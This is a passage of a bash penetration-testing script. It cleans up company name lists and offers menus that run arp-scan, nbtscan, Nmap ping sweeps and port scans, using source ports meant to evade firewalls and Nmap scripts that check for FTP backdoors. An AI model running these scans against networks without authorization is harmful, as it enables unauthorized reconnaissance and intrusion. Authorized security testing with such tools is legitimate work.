s/Greensboro$//g; s/Greensburg$//g; s/Greencastle$//g; s/Greeneville$//g; s/Greenfield$//g; s/Greenwood$//g; s/Greenport$//g; s/Greenville$//g; 
s/Greenwich$//g; s/Gretna$//g; s/Groton$//g;  s/Grovel$//g; s/Gulfport$//g; s/Gunpowder$//g; s/Gurgaon$//g; s/Gurnee$//g; s/Hackensack$//g; 
s/Hackettstown$//g; s/Haddon$//g; s/Halethorpe$//g; s/Halifax$//g; s/Hamilton$//g; s/Hamlin$//g; s/Hammond$//g; s/Hampden$//g; s/Hampstead$//g; 
s/Hampton$//g; s/Hamtramck$//g; s/Hanahan$//g; s/Hanover$//g; s/Harlingen$//g; s/Harrisburg$//g; s/Harrisonburg$//g; s/Hartbeespoort$//g; s/Hartford$//g; 
s/Hartland$//g; s/Harvard$//g; s/Hatboro$//g; s/Haslet$//g; s/Hattiesburg$//g; s/Hauppauge$//g; s/Havant$//g; s/Hawthorne$//g; s/Haymarket$//g; 
s/Hazelwood$//g; s/Hazlehurst$//g; s/Hebron$//g; s/Heights$//g; s/Helena$//g; s/Helotes$//g; s/Hendersonville$//g; s/Henderson$//g; s/Henrico$//g; 
s/Hermitage$//g; s/Herndon$//g; s/Hershey$//g; s/Hialeah$//g; s/Highland$//g; s/Hilliard$//g; s/Hillsborough$//g; s/Hilo$//g; s/Hinckley$//g; 
s/Hingham$//g; s/Hobart$//g; s/Hodgdon$//g; s/Hodgkins$//g; s/Holbrook$//g; s/Hollywood$//g; s/Holtsville$//g; s/Homestead$//g; s/Honolulu$//g; 
s/Hookstown$//g; s/Hopewell$//g; s/Hopkins$//g; s/Hopkinton$//g; s/Horsham$//g; s/Hopwood$//g; s/Houston$//g; s/HR$//g; s/Huntersville$//g; 
s/Huntingdon$//g; s/Huntington$//g; s/Huntingtown$//g; s/Huntsville$//g; s/Huron$//g; s/Hurricane$//g; s/Hyattsville$//g; s/Hyderabad$//g; 
s/Illinois$//g; s/Imperial$//g; s/Indialantic$//g; s/indianapolis$//g; s/Indianapolis$//g; s/Indiana$//g; s/India$//g; s/Indio$//g; s/Inglewood$//g; 
s/Ireland$//g; s/Irvine$//g; s/Irving$//g; s/Israel$//g; s/Iselin$//g; s/Italy$//g; s/Ithaca$//g; s/JA$//g; s/Jacksonville$//g; s/Jackson$//g; 
s/Jamaica$//g; s/Jamestown$//g; s/Japan$//g; s/Jber$//g; s/Jeffersonville$//g; s/Jerseyville$//g; s/Jenkintown$//g; s/Jessup$//g; s/Johnston$//g; 
s/Johnstown$//g; s/Joliet$//g; s/Joplin$//g; s/Jupiter$//g; s/Kalamazoo$//g; s/Kanata$//g; s/Kankakee$//g; s/Kaysville$//g; s/Kearney$//g; s/Kearny$//g; 
s/Kennebec$//g; s/Kenner$//g; s/Kennesaw$//g; s/Kennett$//g; s/Kensington$//g; s/Kent$//g; s/Kerrville$//g; s/Kewaunee$//g; s/Kihei$//g; s/Killeen$//g; 
s/Kincaid$//g; s/Kingille$//g; s/Kingfisher$//g; s/Kingston$//g; s/Kingwood$//g; s/Kincaid$//g; s/Kinston$//g; s/Kirkland$//g; s/Kissimmee$//g; 
s/Knightdale$//g; s/Knoxville$//g; s/Korea$//g; s/Lachine$//g; s/Lafayette$//g; s/Lakehurst$//g; s/Lakeland$//g; s/Lakeville$//g; s/Lakewood$//g; 
s/Lamesa$//g; s/Lancaster$//g; s/Landenberg$//g; s/Lanham$//g; s/Lansdale$//g; s/Lansdowne$//g; s/Lansing$//g; s/Laredo$//g; s/Lantana$//g; s/Laurel$//g; 
s/Lawndale$//g; s/Lawnside$//g; s/Lawrenceville$//g; s/Lawrence$//g; s/Lawton$//g; s/Layton$//g; s/Leavenworth$//g; s/Leawood$//g; s/Lebanon$//g; 
s/Leeds$//g; s/Leesburg$//g; s/Leesville$//g; s/Lenexa$//g; s/Lenoir$//g; s/Leonardtown$//g; s/Leonia$//g; s/Letchworth$//g; s/Lewisburg$//g; 
s/Lewiston$//g; s/Lewisville$//g; s/Lexington$//g; s/Libertyville$//g; s/Lichfield$//g;s/Lima$//g; s/Lincoln$//g; s/Linden$//g; s/Lindon$//g; 
s/Linesville$//g; s/Linthicum$//g; s/Linwood$//g; s/Lisle$//g; s/Litchfield$//g; s/Lithonia$//g; s/Lititz$//g; s/Littleton$//g; s/Livermore$//g; 
s/Liverpool$//g; s/Livonia$//g; s/Lockport$//g; s/Logansport$//g; s/logistics$//g; s/Lomita$//g; s/Lompoc$//g; s/London$//g; s/Longmont$//g; 
s/Longueuil$//g; s/Lorton$//g; s/Louisville$//g; s/Loveland$//g; s/Lovettsville$//g; s/Lowell$//g; s/Lubbock$//g; s/Lucedale$//g; s/Lufkin$//g; 
s/Lumberton$//g;  s/Lutherville$//g; s/Luton$//g; s/Lyndhurst$//g; s/Lynnwood$//g; s/Machias$//g; s/Macon$//g; s/Madison$//g; s/Mahwah$//g; 
s/Maidstone$//g; s/Maineville$//g; s/Maine$//g; s/Maitland$//g; s/Malaysia$//g; s/Malvern$//g; s/Manalapan$//g; s/Manassas$//g; s/Manchester$//g; 
s/Manhattan$//g; s/Manheim$//g; s/Manistee$//g; s/Mansfield$//g; s/Marblehead$//g; s/Marietta$//g; s/Marion$//g; s/Marlborough$//g; s/Marlton$//g; 
s/Martin$//g; s/Masontown$//g; s/Matteson$//g; s/Maumee$//g; s/Mayfield$//g; s/Maynard$//g; s/Maysville$//g; s/Mcallen$//g; s/Mcclellan$//g; 
s/Mckinney$//g; s/Meadville$//g; s/Mechanicsburg$//g; s/Mechanicsville$//g; s/Medford$//g; s/Media$//g; s/Melbourne$//g; s/Melrose$//g; s/Melville$//g; 
s/Memphis$//g; s/Menifee$//g; s/Mentor$//g; s/Meriden$//g; s/Meridian$//g; s/Merrill$//g; s/Mesa$//g; s/Metairie$//g; s/Methuen$//g; s/Mexico$//g; 
s/Miamisburg$//g; s/Miami$//g; s/Michigan$//g; s/Mid-Atlantic$//g; s/Middleburg$//g; s/Middlebury$//g; s/Middlesex$//g; s/Middleton$//g; 
s/Middletown$//g; s/Midland$//g; s/Midlothian$//g; s/Midwest$//g; s/Milford$//g; s/Millburn$//g; s/Millersville$//g; s/Milpitas$//g; s/Milwaukee$//g; 
s/Mineral$//g; s/Minneapolis$//g; s/Minnesota$//g; s/Minnetonka$//g; s/Mishawaka$//g; s/Missouri$//g; s/Mitchell$//g; s/Mobile$//g; s/Modesto$//g; 
s/Moline$//g; s/Mongmong$//g; s/Monroeville$//g; s/Monroe$//g; s/Montclair$//g; s/Monterey$//g; s/Montezuma$//g; s/Montgomery$//g; s/Montoursville$//g; 
s/Montvale$//g; s/Moorestown$//g; s/Mooresville$//g; s/Morgantown$//g; s/Morristown$//g; s/Morrisville$//g; s/Moscow$//g; s/Mumbai$//g; s/Mundelein$//g; 
s/Murdock$//g; s/Murfreesboro$//g; s/Murrysville$//g; s/Muskegon$//g; s/Mystic$//g; s/Napa$//g; s/Naperville$//g; s/Naples$//g; s/Narberth$//g; 
s/Narragansett$//g; s/Narrows$//g; s/Nashua$//g; s/Nashville$//g; s/Natick$//g; s/Navarre$//g; s/Nazareth$//g; s/NB$//g; s/Nebraska$//g; s/Neotsu$//g; 
s/Newark$//g; s/Newcastle$//g; s/Newington$//g; s/Newport$//g; s/Newtown$//g; s/Newville$//g; s/Niceville$//g; s/Niles$//g; s/Noblesville$//g; 
s/Nogales$//g; s/Noida$//g; s/Moncton$//g; s/Norcross$//g; s/Norfolk$//g; s/Norman$//g; s/Norristown$//g; s/Northbrook$//g; s/Northeastern$//g; 
s/Northeast$//g; s/Northville$//g; s/Norton$//g; s/Norwalk$//g; s/Norwich$//g; s/Norwood$//g; s/Novato$//g; s/NSW$//g; s/Nutley$//g; s/nyc$//g; 
s/Oakdale$//g; s/Oakland$//g; s/Oakton$//g; s/Oakville$//g; s/Ocala$//g; s/Oceanport$//g; s/Ocoee$//g; s/Odenton$//g; s/Odessa$//g; s/Odon$//g; s/of$//g; 
s/Ogdensburg$//g; s/Ogden$//g; s/Ohio$//g; s/Okemos$//g; s/Olathe$//g; s/Oldsmar$//g; s/Olney$//g; s/Olympia$//g; s/Omaha$//g; s/Onalaska$//g; 
s/Ontario$//g; s/Oologah$//g; s/Orange$//g; s/Oregon$//g; s/Orem$//g; s/orlando$//g; s/Orlando$//g; s/Orrville$//g; s/Ottawa$//g; s/Oviedo$//g; 
s/Owego$//g; s/Owensboro$//g; s/Palatine$//g; s/Palermo$//g; s/Palmdale$//g; s/Palmer$//g; s/Palo$//g; s/Paoli$//g; s/Papillion$//g; s/Paramus$//g; 
s/Parkersburg$//g; s/Parkesburg$//g; s/Parkville$//g; s/Parsippany$//g; s/Pasadena$//g; s/Pascagoula$//g; s/Pasco$//g; s/Passaic$//g; s/Pelham$//g; 
s/Pemberton$//g; s/Pembina$//g; s/Pennington$//g; s/Pensacola$//g; s/Peoria$//g; s/Peterborough$//g; s/Petersburg$//g; s/Pewaukee$//g; s/Pharr$//g; 
s/philadelphia$//g; s/Philadelphia$//g; s/PHILADELPHRegion$//g; s/Philip$//g; s/Phillipsburg$//g; s/Phoenix$//g; s/Picayune$//g; s/Pickerington$//g; 
s/Pierre$//g; s/Pikesville$//g; s/Pinckney$//g; s/Pinconning$//g; s/Pinehurst$//g; s/Pineville$//g; s/Pipersville$//g; s/Piscataway$//g; 
s/Pittsburgh$//g; s/Pittsfield$//g; s/Placitas$//g; s/Plainfield$//g; s/Plainsboro$//g; s/planner$//g; s/Plano$//g; s/Plaquemine$//g; s/Pleasanton$//g; 
s/Pleasantville$//g; s/Plymouth$//g; s/Pocahontas$//g; s/Pomona$//g; s/Pontiac$//g; s/Portage$//g; s/Portland$//g; s/Portsmouth$//g; s/Portugal$//g; 
s/Potomac$//g; s/Poway$//g; s/Prattville$//g; s/Preston$//g; s/Prestwick$//g; s/Princeton$//g; s/Prineville$//g; s/Proctorville$//g; s/Providence$//g; 
s/Provos$//g; s/Pueblo$//g; s/Purcellville$//g; s/Pyrmont$//g; s/Quantico$//g; s/Quincy$//g; s/Radcliff$//g; s/Raleigh$//g; s/Radnor$//g; s/Ramsey$//g; 
s/Rancho$//g; s/Randallstown$//g; s/Randolph$//g; s/Raritan$//g; s/Raymondville$//g; s/Rayville$//g; s/Reading$//g; s/Redlands$//g; s/Redmond$//g; 
s/Reisterstown$//g; s/Remington$//g; s/Reno$//g; s/Rensselaer$//g; s/Renovo$//g; s/Reston$//g; s/Reynoldsburg$//g; s/Richardson$//g; s/Richland$//g; 
s/Richmond$//g; s/Ridgecrest$//g; s/Ridgeland$//g; s/Ridgewood$//g; s/Ringoes$//g; s/Riverdale$//g; s/Riverside$//g; s/Rivervale$//g; s/Roanoke$//g; 
s/Rochester$//g; s/Rockaway$//g; s/Rockford$//g; s/Rockledge$//g; s/Rocklin$//g; s/Rockport$//g; s/Rockville$//g; s/Romeoville$//g; s/Rome$//g; 
s/Romulus$//g; s/Rosamond$//g; s/Roseburg$//g; s/Rosemead$//g; s/Roseville$//g; s/Roswell$//g; s/Rougemont$//g; s/Royersford$//g; s/Riverton$//g; 
s/Ruckersville$//g; s/Russia$//g; s/Sacramento$//g; s/Salem$//g; s/Salina$//g; s/Salisbury$//g; s/Sandton$//g; s/Sanford$//g; s/Sanibel$//g; 
s/Santee$//g; s/Sarasota$//g; s/Saucier$//g; s/Savannah$//g; s/Sayreville$//g; s/Scarsdale$//g; s/Schaumburg$//g; s/Schenectady$//g; s/Schererville$//g; 
s/Scottsdale$//g; s/Scranton$//g; s/Seaford$//g; s/Seattle$//g; s/SEATTLE$//g; s/Sebring$//g; s/Secaucus$//g; s/Sedalia$//g; s/Sylmar$//g; 
s/Seminole$//g; s/Serilingamp$//g; s/Severn$//g; s/Sewell$//g; s/Shalimar$//g; s/Sharpes$//g; s/Shelbyville$//g; s/Shorewood$//g; s/Shreveport$//g; 
s/Shrewsbury$//g; s/Silverdale$//g; s/Simpsonville$//g; s/Singapore$//g; s/Sitka$//g; s/Skillman$//g; s/Slc$//g; s/Slidell$//g; s/Smithfield$//g; 
s/Smithville$//g; s/Smyrna$//g; s/Socorro$//g; s/Solihull$//g; s/Somerset$//g; s/Southborough$//g; s/Southbridge$//g; s/Southfield$//g; s/southeast$//g; 
s/Southeast$//g; s/Southaven$//g; s/Southampton$//g; s/Southlake$//g; s/Southwest$//g; s/SP$//g; s/Sparks$//g; s/Spartanburg$//g; s/Sparta$//g; 
s/Spokane$//g; s/Spotsylvania$//g; s/Springfield$//g; s/Spring$//g; s/Square$//g; s/Stafford$//g; s/Stamford$//g; s/Sterling$//g; s/Stillwater$//g; 
s/Strasburg$//g; s/Strongsville$//g; s/Subiaco$//g; s/Sudbury$//g; s/Suffolk$//g; s/Suitland$//g; s/Summerville$//g; s/Summit$//g; s/Sunnyvale$//g; 
s/Superior$//g; s/Surbiton$//g; s/Surry$//g; s/Suwanee$//g; s/Swainsboro$//g; s/Swanton$//g; s/Swarthmore$//g; s/Swindon$//g; s/Switzerland$//g; 
s/Sydney$//g; s/Sykesville$//g; s/Syracuse$//g; s/Tacoma$//g; s/Taiwan$//g; s/Tallahassee$//g; s/Tampa$//g; s/Taneytown$//g; s/Tarzana$//g; 
s/Taunton$//g; s/Tavares$//g; s/Tecate$//g; s/Telluride$//g; s/Tempe$//g; s/Tenafly$//g; s/Terrell$//g; s/Tewksbury$//g; s/Texas$//g; s/-the$//g; 
s/Thomaston$//g; s/Thomasville$//g; s/Thorndale$//g; s/Thurso$//g; s/Timonium$//g; s/Tipton$//g; s/Titusville$//g; s/Toano$//g; s/Toledo$//g; s/Toll$//g; 
s/Tomball$//g; s/Toney$//g; s/Topeka$//g; s/Tornado$//g; s/Toronto$//g; s/Torrance$//g; s/Towson$//g; s/Trenton$//g; s/Tifton$//g; s/Troy$//g; 
s/Tucson$//g; s/Tullahoma$//g; s/Tulsa$//g; s/Turkey$//g; s/Tuscaloosa$//g; s/Tustin$//g; s/Twinsburg$//g; s/Tyngsboro$//g; s/Underhill$//g; 
s/Uniondale$//g; s/Uniontown$//g; s/Union$//g; s/Urbana$//g; s/Urbandale$//g; s/Uxbridge$//g; s/Uvalde$//g; s/Vail$//g; s/Valdosta$//g; s/Valencia$//g; 
s/Vanceboro$//g; s/Vancouver$//g; s/Vandalia$//g; s/Vandergrift$//g; s/Venice$//g; s/Ventura$//g; s/Verona$//g; s/Vestal$//g; s/VIC$//g; s/Vicksburg$//g; 
s/Vienna$//g; s/Vincentown$//g; s/Vineland$//g; s/Visalia$//g; s/Vista$//g; s/Wagoner$//g; s/Wakefield$//g; s/Waldorf$//g; s/Wallingford$//g; 
s/Waltham$//g; s/Warminster$//g; s/Warrenton$//g; s/Warren$//g; s/Warrington$//g; s/Warsaw$//g; s/Warwick$//g; s/Washington$//g; s/Wasilla$//g; 
s/Waterford$//g; s/Watertown$//g; s/Wauwatosa$//g; s/Wauconda$//g; s/Waukesha$//g; s/Wausau$//g; s/Wayne$//g; s/Weare$//g; s/Weatherford$//g; 
s/Webster$//g; s/Wellington$//g; s/Westbury$//g; s/Westborough$//g; s/Westchester$//g; s/Westerville$//g; s/Westfield$//g; s/Westlake$//g; 
s/Westminster$//g; s/Westmont$//g; s/Westport$//g; s/Westwego$//g; s/Wexford$//g; s/Wheaton$//g; s/Wheeling$//g; s/Whippany$//g; s/Whittier$//g; 
s/Wildfires//g; s/Wildwood//g; s/Williamsburg//g; s/Williamsport//g; s/Willimantic//g; s/Williston$//g; s/Wilmington$//g; s/Wilton$//g; s/Winchester$//g; 
s/Windsor$//g; s/Windermere$//g; s/Winder$//g; s/Winnetka$//g; s/Winona$//g; s/Wisconsin$//g; s/Wisconsin$//g; s/Wichita$//g; s/Woburn$//g; s/Woking$//g; 
s/Woodbridge$//g; s/Woodstock$//g; s/Woodstown$//g; s/Wynnewood$//g; s/Wyoming$//g; s/Xenia$//g; s/Yardley$//g; s/Yeovil$//g; s/Yokine$//g; 
s/Youngstown$//g; s/Youngsville$//g; s/Yorktown$//g; s/York$//g; s/Yuma$//g; s/Zanesville$//g; s/Zeeland$//g; 
s/Zionsville$//g; s/Zion$//g; s/[ \t]*$//' > tmp3

head tmp3
echo
echo
echo -n "Copy/paste the company name from the second column: "
read name

# Check for no answer
if [[ -z $name ]]; then
     f_error
fi

sed "s/$name//g" tmp3 | sort -u > $home/data/names.txt
rm tmp*

echo
echo $medium
echo
printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/names.txt
echo
echo
exit
}

##############################################################################################################

f_generateTargetList(){
clear
f_banner

echo -e "\x1B[1;34mSCANNING\x1B[0m"
echo
echo "1.  Local area network"
echo "2.  NetBIOS"
echo "3.  netdiscover"
echo "4.  Ping sweep"
echo "5.  Previous menu"
echo
echo -n "Choice: "
read choice

case $choice in
     1) f_errorOSX

     echo
     echo -n "Interface to scan: "
     read interface

     # Check for no answer
     if [[ -z $interface ]]; then
          f_error
     fi

     arp-scan -l -I $interface | egrep -v '(arp-scan|Interface|packets|Polycom|Unknown)' | awk '{print $1}' | $sip | sed '/^$/d' > $home/data/hosts-arp.txt

     echo $medium
     echo
     echo "***Scan complete.***"
     echo
     echo
     printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/hosts-arp.txt
     echo
     echo
     exit;;
     2) f_errorOSX; f_netbios;;
     3) f_errorOSX; netdiscover;;
     4) f_pingsweep;;
     5) f_main;;
     *) f_error;;
esac
}

##############################################################################################################

f_netbios(){
clear
f_banner

echo -e "\x1B[1;34mType of input:\x1B[0m"
echo
echo "1.  List containing IPs."
echo "2.  CIDR"
echo
echo -n "Choice: "
read choice

case $choice in
     1)
     f_location

     echo
     echo $medium
     echo
     nbtscan -f $location
     echo
     echo
     exit;;

     2)
     echo
     echo -n "Enter your CIDR: "
     read cidr

     # Check for no answer
     if [[ -z $cidr ]]; then
          f_error
     fi

     echo
     echo $medium
     echo
     nbtscan -r $cidr
     echo
     echo
     exit;;

     *) f_error;;
esac
}

##############################################################################################################

f_pingsweep(){
clear
f_banner
f_typeofscan

echo -e "\x1B[1;34mType of input:\x1B[0m"
echo
echo "1.  List containing IPs, ranges and/or CIDRs."
echo "2.  Manual"
echo
echo -n "Choice: "
read choice

case $choice in
     1)
     f_location

     echo
     echo "Running an Nmap ping sweep for live hosts."
     nmap -sn -PS -PE --stats-every 10s -g $sourceport -iL $location > tmp
     ;;

     2)
     echo
     echo -n "Enter your targets: "
     read manual

     # Check for no answer
     if [[ -z $manual ]]; then
          f_error
     fi

     echo
     echo "Running an Nmap ping sweep for live hosts."
     nmap -sn -PS -PE --stats-every 10s -g $sourceport $manual > tmp
     ;;

     *) f_error;;
esac

cat tmp | grep 'report' | awk '{print $5}' > tmp2
mv tmp2 $home/data/hosts-ping.txt
rm tmp

echo
echo $medium
echo
echo "***Scan complete.***"
echo
echo
printf 'The new report is located at \x1B[1;33m%s\x1B[0m\n' $home/data/hosts-ping.txt
echo
echo
exit
}

##############################################################################################################

f_scanname(){
f_typeofscan

echo -e "\x1B[1;33m[*] Warning spaces in the name will cause errors\x1B[0m"
echo
echo -n "Name of scan: "
read name

# Check for no answer
if [[ -z $name ]]; then
     f_error
fi

mkdir -p $name
}

##############################################################################################################

f_typeofscan(){
echo -e "\x1B[1;34mType of scan: \x1B[0m"
echo
echo "1.  External"
echo "2.  Internal"
echo "3.  Previous menu"
echo
echo -n "Choice: "
read choice

case $choice in
     1)
     echo
     echo -e "\x1B[1;33m[*] Setting source port to 53 and max probe round trip to 1.5s.\x1B[0m"
     sourceport=53
     maxrtt=1500ms
     echo
     echo $medium
     echo
     ;;

     2)
     echo
     echo -e "\x1B[1;33m[*] Setting source port to 88 and max probe round trip to 500ms.\x1B[0m"
     sourceport=88
     maxrtt=500ms
     echo
     echo $medium
     echo
     ;;

     3) f_main;;
     *) f_error;;
esac
}

##############################################################################################################

f_cidr(){
clear
f_banner
f_scanname

echo
echo Usage: 192.168.0.0/16
echo
echo -n "CIDR: "
read cidr

# Check for no answer
if [[ -z $cidr ]]; then
     rm -rf $name
     f_error
fi

# Check for wrong answer

sub=$(echo $cidr | cut -d '/' -f2)
max=32

if [ "$sub" -gt "$max" ]; then
     f_error
fi

echo $cidr | grep '/' > /dev/null 2>&1

if [ $? -ne 0 ]; then
     f_error
fi

echo $cidr | grep [[:alpha:]\|[,\\]] > /dev/null 2>&1

if [ $? -eq 0 ]; then
     f_error
fi

echo $cidr > tmp-list
location=tmp-list

echo
echo -n "Do you have an exclusion list? (y/N) "
read exclude

if [ "$exclude" == "y" ]; then
     echo -n "Enter the path to the file: "
     read excludefile

     if [[ -z $excludefile ]]; then
          f_error
     fi

     if [ ! -f $excludefile ]; then
          f_error
     fi
else
     touch tmp
     excludefile=tmp
fi

START=$(date +%r\ %Z)

f_scan
f_ports
f_scripts
f_metasploit
f_report
}

##############################################################################################################

f_list(){
clear
f_banner
f_scanname
f_location

touch tmp
excludefile=tmp

START=$(date +%r\ %Z)

f_scan
f_ports
f_scripts
f_metasploit
f_report
}

##############################################################################################################

f_single(){
clear
f_banner
f_scanname

echo
echo -n "IP, range, or URL: "
read target

# Check for no answer
if [[ -z $target ]]; then
     rm -rf $name
     f_error
fi

echo $target > tmp-target
location=tmp-target

touch tmp
excludefile=tmp

START=$(date +%r\ %Z)

f_scan
f_ports
f_scripts
f_metasploit
f_report
}

##############################################################################################################

f_scan(){
custom='1-1040,1050,1080,1099,1158,1344,1352,1433,1521,1720,1723,1883,1911,1962,2049,2202,2375,2628,2947,3000,3031,3050,3260,3306,3310,3389,3500,3632,4369,5019,5040,5060,5432,5560,5631,5632,5666,5672,5850,5900,5920,5984,5985,6000,6001,6002,6003,6004,6005,6379,6666,7210,7634,7777,8000,8009,8080,8081,8091,8222,8332,8333,8400,8443,8834,9000,9084,9100,9160,9600,9999,10000,11211,12000,12345,13364,19150,27017,28784,30718,35871,37777,46824,49152,50000,50030,50060,50070,50075,50090,60010,60030'
full='1-65535'
udp='53,67,123,137,161,407,500,523,623,1434,1604,1900,2302,2362,3478,3671,5353,5683,6481,17185,31337,44818,47808'

echo
echo -n "Perform full TCP port scan? (y/N) "
read scan

if [ "$scan" == "y" ]; then
     tcp=$full
else
     tcp=$custom
fi

echo
echo -n "Perform version detection? (y/N) "
read vdetection

if [ "$vdetection" == "y" ]; then
     S='sSV'
     U='sUV'
else
     S='sS'
     U='sU'
fi

echo
echo -n "Set scan delay. (0-5, enter for normal) "
read delay

# Check for no answer
if [[ -z $delay ]]; then
     delay='0'
fi

if [ $delay -lt 0 ] || [ $delay -gt 5 ]; then
     f_error
fi

echo
echo $medium

nmap -iL $location --excludefile $excludefile --privileged -n -PE -PS21-23,25,53,80,110-111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 -PU53,67-69,123,135,137-139,161-162,445,500,514,520,631,1434,1900,4500,49152 -$S -$U -p T:$tcp,U:$udp --max-retries 3 --min-rtt-timeout 100ms --max-rtt-timeout $maxrtt --initial-rtt-timeout 500ms --defeat-rst-ratelimit --min-rate 450 --max-rate 15000 --open --stats-every 10s -g $sourceport --scan-delay $delay -oA $name/nmap

x=$(grep '(0 hosts up)' $name/nmap.nmap)

if [[ -n $x ]]; then
     rm -rf "$name" tmp
     rm tmp-target
     echo
     echo $medium
     echo
     echo "***Scan complete.***"
     echo
     echo
     echo -e "\x1B[1;33m[*] No live hosts were found.\x1B[0m"
     echo
     echo
     exit
fi

# Clean up
egrep -v '(0000:|0010:|0020:|0030:|0040:|0050:|0060:|0070:|0080:|0090:|00a0:|00b0:|00c0:|00d0:|1 hop|closed|guesses|GUESSING|filtered|fingerprint|FINGERPRINT|general purpose|initiated|latency|Network Distance|No exact OS|No OS matches|OS:|OS CPE|Please report|RTTVAR|scanned in|SF|unreachable|Warning|WARNING)' $name/nmap.nmap | sed 's/Nmap scan report for //' | sed '/^$/! b end; n; /^$/d; : end' > $name/nmap.txt

grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' $name/nmap.nmap | $sip > $name/hosts.txt
hosts=$(wc -l $name/hosts.txt | cut -d ' ' -f1)

grep 'open' $name/nmap.txt | grep -v 'WARNING' | awk '{print $1}' | sort -un > $name/ports.txt
grep 'tcp' $name/ports.txt | cut -d '/' -f1 > $name/ports-tcp.txt
grep 'udp' $name/ports.txt | cut -d '/' -f1 > $name/ports-udp.txt

grep 'open' $name/nmap.txt | grep -v 'really open' | awk '{for (i=4;i<=NF;i++) {printf "%s%s",sep, $i;sep=" "}; printf "\n"}' | sed 's/^ //' | sort -u | sed '/^$/d' > $name/banners.txt

for i in $(cat $name/ports-tcp.txt); do
     TCPPORT=$i
     cat $name/nmap.gnmap | grep " $i/open/tcp//http/\| $i/open/tcp//http-alt/\| $i/open/tcp//http-proxy/\| $i/open/tcp//appserv-http/" |
     sed -e 's/Host: //g' -e 's/ (.*//g' -e 's.^.http://.g' -e "s/$/:$i/g" | $sip >> tmp
     cat $name/nmap.gnmap | grep " $i/open/tcp//https/\| $i/open/tcp//https-alt/\| $i/open/tcp//ssl|giop/\| $i/open/tcp//ssl|http/\| $i/open/tcp//ssl|unknown/" |
     sed -e 's/Host: //g' -e 's/ (.*//g' -e 's.^.https://.g' -e "s/$/:$i/g" | $sip >> tmp2
done

sed 's/http:\/\///g' tmp > $name/http.txt
sed 's/https:\/\///g' tmp2 > $name/https.txt

# Remove all empty files
find $name/ -type f -empty -exec rm {} +
}

##############################################################################################################

f_ports(){
echo
echo $medium
echo
echo -e "\x1B[1;34mLocating high value ports.\x1B[0m"
echo "     TCP"
TCP_PORTS="13 19 21 22 23 25 37 69 70 79 80 102 110 111 119 135 139 143 389 433 443 445 465 502 512 513 514 523 524 548 554 563 587 623 631 636 771 831 873 902 993 995 998 1050 1080 1099 1158 1344 1352 1433 1521 1720 1723 1883 1911 1962 2049 2202 2375 2628 2947 3000 3031 3050 3260 3306 3310 3389 3500 3632 4369 5019 5040 5060 5432 5560 5631 5632 5666 5672 5850 5900 5920 5984 5985 6000 6001 6002 6003 6004 6005 6379 6666 7210 7634 7777 8000 8009 8080 8081 8091 8222 8332 8333 8400 8443 8834 9000 9084 9100 9160 9600 9999 10000 11211 12000 12345 13364 19150 27017 28784 30718 35871 37777 46824 49152 50000 50030 50060 50070 50075 50090 60010 60030"

for i in $TCP_PORTS; do
     cat $name/nmap.gnmap | grep "\<$i/open/tcp\>" | cut -d ' ' -f2 > $name/$i.txt
done

if [[ -e $name/523.txt ]]; then
     mv $name/523.txt $name/523-tcp.txt
fi

if [[ -e $name/5060.txt ]]; then
     mv $name/5060.txt $name/5060-tcp.txt
fi

echo "     UDP"
UDP_PORTS="53 67 123 137 161 407 500 523 623 1434 1604 1900 2302 2362 3478 3671 5353 5683 6481 17185 31337 44818 47808"

for i in $UDP_PORTS; do
     cat $name/nmap.gnmap | grep "\<$i/open/udp\>" | cut -d ' ' -f2 > $name/$i.txt
done

if [[ -e $name/523.txt ]]; then
     mv $name/523.txt $name/523-udp.txt
fi

# Combine Apache HBase ports and sort
cat $name/60010.txt $name/60030.txt > tmp
$sip tmp > $name/apache-hbase.txt

# Combine Bitcoin ports and sort
cat $name/8332.txt $name/8333.txt > tmp
$sip tmp > $name/bitcoin.txt

# Combine DB2 ports and sort
cat $name/523-tcp.txt $name/523-udp.txt > tmp
$sip tmp > $name/db2.txt

# Combine Hadoop ports and sort
cat $name/50030.txt $name/50060.txt $name/50070.txt $name/50075.txt $name/50090.txt > tmp
$sip tmp > $name/hadoop.txt

# Combine NNTP ports and sort
cat $name/119.txt $name/433.txt $name/563.txt > tmp
$sip tmp > $name/nntp.txt

# Combine SMTP ports and sort
cat $name/25.txt $name/465.txt $name/587.txt > tmp
$sip tmp > $name/smtp.txt

# Combine X11 ports and sort
cat $name/6000.txt $name/6001.txt $name/6002.txt $name/6003.txt $name/6004.txt $name/6005.txt > tmp
$sip tmp > $name/x11.txt

# Remove all empty files
find $name/ -type f -empty -exec rm {} +
}

##############################################################################################################

f_cleanup(){
sed 's/Nmap scan report for //' tmp | egrep -v '(0 of 100|afp-serverinfo:|ACCESS_DENIED|appears to be clean|cannot|closed|close|Compressors|Could not|Couldn|ctr-|Denied|denied|Did not|DISABLED|dns-nsid:|dns-service-discovery:|Document Moved|doesn|eppc-enum-processes|error|Error|ERROR|Failed to get|failed|filtered|GET|hbase-region-info:|HEAD|Host is up|Host script results|impervious|incorrect|is GREAT|latency|ldap-rootdse:|LDAP Results|Likely CLEAN|MAC Address|Mac OS X security type|nbstat:|No accounts left|No Allow|no banner|none|Nope.|not allowed|Not Found|Not Shown|not supported|NOT VULNERABLE|nrpe-enum:|ntp-info:|rdp-enum-encryption:|remaining|rpcinfo:|seconds|Security types|See http|Server not returning|Service Info|Skipping|smb-check-vulns|smb-mbenum:|sorry|Starting|telnet-encryption:|Telnet server does not|TIMEOUT|Unauthorized|uncompressed|unhandled|Unknown|viewed over a secure|vnc-info:|wdb-version:)' | grep -v "Can't" > tmp4
}

##############################################################################################################

f_scripts(){
echo
echo $medium
echo
echo -e "\x1B[1;34mRunning Nmap scripts.\x1B[0m"

# If the file for the corresponding port doesn't exist, skip
if [[ -e $name/13.txt ]]; then
     echo "     Daytime"
     nmap -iL $name/13.txt -Pn -n --open -p13 --script=daytime --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
     f_cleanup
     mv tmp4 $name/script-13.txt
fi

if [[ -e $name/21.txt ]]; then
     echo "     FTP"
     nmap -iL $name/21.txt -Pn -n --open -p21 --script=banner,ftp-anon,ftp-bounce,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ssl*,tls-nextprotoneg -sV --host-timeout 5m --min-hostgroup 100 -g $sourceport --scan-delay $delay > tmp
